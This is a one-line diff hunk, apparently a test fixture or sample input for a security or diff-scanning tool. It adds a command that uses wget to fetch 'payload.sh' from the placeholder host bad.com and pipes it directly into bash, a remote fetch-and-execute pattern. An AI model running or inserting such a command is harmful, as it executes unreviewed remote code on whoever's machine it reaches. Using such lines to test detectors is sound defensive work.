@@ -1,0 +1,1 @@
+wget --output-document=- http://bad.com/payload.sh | bash
